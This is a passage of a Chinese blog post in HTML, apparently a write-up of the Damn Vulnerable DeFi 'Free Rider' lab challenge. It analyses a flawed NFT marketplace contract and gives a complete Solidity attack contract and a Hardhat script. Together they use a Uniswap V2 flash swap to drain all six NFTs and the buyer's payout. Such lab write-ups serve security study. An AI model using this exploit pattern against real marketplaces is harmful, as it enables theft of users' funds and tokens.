class="variable language_">this</span>)),</span><br><span class="line">            <span class="string">&quot;Account offering must have approved transfer&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        offers[tokenId] = price;</span><br><span class="line"></span><br><span class="line">        amountOfOffers++;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">NFTOffered</span>(msg.<span class="property">sender</span>, tokenId, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buyMany</span>(<span class="params">uint256[] calldata tokenIds</span>) external payable nonReentrant &#123;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; tokenIds.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="title function_">_buyOne</span>(tokenIds[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_buyOne</span>(<span class="params">uint256 tokenId</span>) private &#123;       </span><br><span class="line">        uint256 priceToPay = offers[tokenId];</span><br><span class="line">        <span class="built_in">require</span>(priceToPay &gt; <span class="number">0</span>, <span class="string">&quot;Token is not being offered&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= priceToPay, <span class="string">&quot;Amount paid is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">        amountOfOffers--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transfer from seller to buyer</span></span><br><span class="line">        token.<span class="title function_">safeTransferFrom</span>(token.<span class="title function_">ownerOf</span>(tokenId), msg.<span class="property">sender</span>, tokenId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// pay seller</span></span><br><span class="line">        <span class="title function_">payable</span>(token.<span class="title function_">ownerOf</span>(tokenId)).<span class="title function_">sendValue</span>(priceToPay);</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">NFTBought</span>(msg.<span class="property">sender</span>, tokenId, priceToPay);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看完合约我们可以发现，在_buyOne中存在两个问题，一个是用msg.value来判断价格是否超出当前价格，如果我们进行多次执行就能用一份价格买走多个nft；二是在nft从owner转给我们之后，再将用于购买的eth又发给了代币拥有者，但这时的代币拥有者已经变成了买家，所以等于买家没花任何钱就买到了nft。<br>买家合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FreeRiderBuyer</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FreeRiderBuyer</span> is <span class="title class_">ReentrancyGuard</span>, <span class="title class_">IERC721Receiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line">    address private immutable partner;</span><br><span class="line">    <span class="title class_">IERC721</span> private immutable nft;</span><br><span class="line">    uint256 private constant <span class="variable constant_">JOB_PAYOUT</span> = <span class="number">45</span> ether;</span><br><span class="line">    uint256 private received;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _partner, address _nft</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="variable constant_">JOB_PAYOUT</span>);</span><br><span class="line">        partner = _partner;</span><br><span class="line">        nft = <span class="title class_">IERC721</span>(_nft);</span><br><span class="line">        <span class="title class_">IERC721</span>(_nft).<span class="title function_">setApprovalForAll</span>(msg.<span class="property">sender</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">onERC721Received</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        address,</span></span><br><span class="line"><span class="params">        uint256 _tokenId,</span></span><br><span class="line"><span class="params">        bytes memory</span></span><br><span class="line"><span class="params">    </span>) </span><br><span class="line">        external</span><br><span class="line">        override</span><br><span class="line">        nonReentrant</span><br><span class="line">        returns (bytes4) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(nft));</span><br><span class="line">        <span class="built_in">require</span>(tx.<span class="property">origin</span> == partner);</span><br><span class="line">        <span class="built_in">require</span>(_tokenId &gt;= <span class="number">0</span> &amp;&amp; _tokenId &lt;= <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">require</span>(nft.<span class="title function_">ownerOf</span>(_tokenId) == <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        </span><br><span class="line">        received++;</span><br><span class="line">        <span class="keyword">if</span>(received == <span class="number">6</span>) &#123;            </span><br><span class="line">            <span class="title function_">payable</span>(partner).<span class="title function_">sendValue</span>(<span class="variable constant_">JOB_PAYOUT</span>);</span><br><span class="line">        &#125;            </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IERC721Receiver</span>.<span class="property">onERC721Received</span>.<span class="property">selector</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个没啥好说的，就是将六个nft全部发给买家后，买家就会给我们45个eth</p>
<p>因此我们只需要拥有15个eth，就能够买到所有的nft，那这十五个eth从哪来呢，我又想到了uniswap,我们知道uniswapV2是提供闪电贷功能的，所以，只要我们从uniswapV2中借出15个eth，买到nft后再卖出两个，再买入两个，我们就可以将nft发给买家，并把借来的15个eth连利息一起还给uniswap。</p>
<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@uniswap/v2-core/contracts/interfaces/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../free-rider/FreeRiderNFTMarketplace.sol&quot;</span>;</span><br><span class="line">contract <span class="title class_">AttackFreeRider</span> is <span class="title class_">IUniswapV</span>2Callee , <span class="title class_">IERC721Receiver</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line">    address  payable immutable weth;</span><br><span class="line">    address immutable dvt;</span><br><span class="line">    address  immutable factory;</span><br><span class="line">    address payable  immutable buyerMarketPlace;</span><br><span class="line">    address immutable buyer;</span><br><span class="line">    address immutable nft;</span><br><span class="line">    address immutable owner;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address payable _weth,</span></span><br><span class="line"><span class="params">        address _factory,</span></span><br><span class="line"><span class="params">        address _dvt,</span></span><br><span class="line"><span class="params">        address payable _buyerMarketplace,</span></span><br><span class="line"><span class="params">        address _buyer,</span></span><br><span class="line"><span class="params">        address _nft</span></span><br><span class="line"><span class="params">    </span>)  &#123;</span><br><span class="line">        weth = _weth;</span><br><span class="line">        dvt = _dvt;</span><br><span class="line">        factory = _factory;</span><br><span class="line">        buyerMarketPlace = _buyerMarketplace;</span><br><span class="line">        buyer = _buyer;</span><br><span class="line">        nft = _nft;</span><br><span class="line">        owner=msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashSwap</span>(<span class="params">address _tokenBorrow, uint256 _amount</span>) external &#123;</span><br><span class="line">        address pair = <span class="title class_">IUniswapV</span>2Factory(factory).<span class="title function_">getPair</span>(_tokenBorrow, dvt);</span><br><span class="line">        <span class="built_in">require</span>(pair != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;!pair init&quot;</span>);</span><br><span class="line">        address token0 = <span class="title class_">IUniswapV</span>2Pair(pair).<span class="title function_">token0</span>();</span><br><span class="line">        address token1 = <span class="title class_">IUniswapV</span>2Pair(pair).<span class="title function_">token1</span>();</span><br><span class="line">        uint256 amount0Out = _tokenBorrow == token0 ? _amount : <span class="number">0</span>;</span><br><span class="line">        uint256 amount1Out = _tokenBorrow == token1 ? _amount : <span class="number">0</span>;</span><br><span class="line">        bytes memory data = abi.<span class="title function_">encode</span>(_tokenBorrow, _amount);</span><br><span class="line">        <span class="title class_">IUniswapV</span>2Pair(pair).<span class="title function_">swap</span>(amount0Out, amount1Out, <span class="title function_">address</span>(<span class="variable language_">this</span>), data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">uniswapV2Call</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address sender,</span></span><br><span class="line"><span class="params">        uint256 amount0,</span></span><br><span class="line"><span class="params">        uint256 amount1,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) external override &#123;</span><br><span class="line"></span><br><span class="line">        address token0 = <span class="title class_">IUniswapV</span>2Pair(msg.<span class="property">sender</span>).<span class="title function_">token0</span>();</span><br><span class="line">        address token1 = <span class="title class_">IUniswapV</span>2Pair(msg.<span class="property">sender</span>).<span class="title function_">token1</span>();</span><br><span class="line">        address pair = <span class="title class_">IUniswapV</span>2Factory(factory).<span class="title function_">getPair</span>(token0, token1);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == pair, <span class="string">&quot;!pair&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sender == <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;!sender&quot;</span>);</span><br><span class="line">        (address tokenBorrow, uint256 amount) = abi.<span class="title function_">decode</span>(</span><br><span class="line">            data,</span><br><span class="line">            (address, uint256)</span><br><span class="line">        );</span><br><span class="line">        uint256 fee = ((amount * <span class="number">3</span>) / <span class="number">997</span>) + <span class="number">1</span>;</span><br><span class="line">        uint256 amountToRepay = amount + fee;</span><br><span class="line">        uint256 currBal = <span class="title class_">IERC20</span>(tokenBorrow).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        tokenBorrow.<span class="title function_">functionCall</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;withdraw(uint256)&quot;</span>, currBal));</span><br><span class="line">        uint256[] memory tokenIds = <span class="keyword">new</span> uint256[](<span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            tokenIds[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">FreeRiderNFTMarketplace</span>(buyerMarketPlace).<span class="property">buyMany</span>&#123;<span class="attr">value</span>: <span class="number">15</span> ether&#125;(</span><br><span class="line">            tokenIds</span><br><span class="line">        );</span><br><span class="line">        uint256[] memory tokenIdsSell = <span class="keyword">new</span> uint256[](<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            tokenIdsSell[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256[] memory ethervalue= <span class="keyword">new</span> uint256[](<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            ethervalue[i] = <span class="number">15</span> ether;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">DamnValuableNFT</span>(nft).<span class="title function_">setApprovalForAll</span>(buyerMarketPlace, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">FreeRiderNFTMarketplace</span>(buyerMarketPlace).<span class="title function_">offerMany</span>(</span><br><span class="line">            tokenIdsSell,</span><br><span class="line">            ethervalue</span><br><span class="line">        );</span><br><span class="line">        <span class="title class_">FreeRiderNFTMarketplace</span>(buyerMarketPlace).<span class="property">buyMany</span>&#123;<span class="attr">value</span>: <span class="number">15</span> ether&#125;(</span><br><span class="line">            tokenIdsSell</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="title class_">DamnValuableNFT</span>(nft).<span class="title function_">safeTransferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), buyer, i);</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success,) = weth.<span class="property">call</span>&#123;<span class="attr">value</span>: <span class="number">15.1</span> ether&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;failed to deposit weth&quot;</span>);</span><br><span class="line">        <span class="title class_">IERC20</span>(tokenBorrow).<span class="title function_">transfer</span>(pair, amountToRepay);</span><br><span class="line">        <span class="title function_">payable</span>(owner).<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onERC721Received</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address operator,</span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        uint256 tokenId,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) external override pure returns (bytes4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IERC721Receiver</span>.<span class="property">onERC721Received</span>.<span class="property">selector</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>js攻击合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">AttackFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;AttackFreeRider&quot;</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> attackContract = <span class="keyword">await</span> <span class="title class_">AttackFactory</span>.<span class="title function_">deploy</span>(</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>, </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">uniswapFactory</span>.<span class="property">address</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">marketplace</span>.<span class="property">address</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buyerContract</span>.<span class="property">address</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">nft</span>.<span class="property">address</span>,</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> attackContract.<span class="title function_">flashSwap</span>(<span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>, <span class="variable constant_">NFT_PRICE</span>, &#123;</span><br><span class="line">            <span class="attr">gasLimit</span>: <span class="number">1e6</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>思路与上面分析的思路一样，先从uniswapV2中借15个weth,然后取出对应的eth，然后买入6个nft,卖出两个，再买入，我们就同时拥有了六个nft和15.5个eth，随后将eth存入weth后返还给uniswap，再将nft一起发给买家，即达到攻击目的。<br><img src="https://img-blog.csdnimg.cn/07bd6c207b444d5fa16356ee2e182364.png" alt="在这里插入图片描述"><br>执行脚本，攻击完成。</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>lucifer
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-6-10/" title="DamnVulnerableDeFi靶场实战(6-10)">http://example.com/2022/12/01/DamnVulnerableDeFi靶场实战-6-10/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-1-5/" rel="prev" title="DamnVulnerableDeFi靶场实战(1-5)">
      <i class="fa fa-chevron-left"></i> DamnVulnerableDeFi靶场实战(1-5)
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/12/01/DdmnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-11-13/" rel="next" title="DdmnVulnerableDeFi靶场实战(11-13)">
      DdmnVulnerableDeFi靶场实战(11-13) <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Selfie"><span class="nav-number">1.</span> <span class="nav-text">Selfie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Compromised"><span class="nav-number">2.</span> <span class="nav-text">Compromised</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Puppet"><span class="nav-number">3.</span> <span class="nav-text">Puppet</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Puppet-v2"><span class="nav-number">4.</span> <span class="nav-text">Puppet v2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Free-rider"><span class="nav-number">5.</span> <span class="nav-text">Free rider</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-4"><span class="nav-number">5.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">lucifer</p>
  <div class="site-description" itemprop="description">我的老婆严菡是猪</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022-12 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lucifer</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">190k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:53</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  















  

  

</body>
</html>
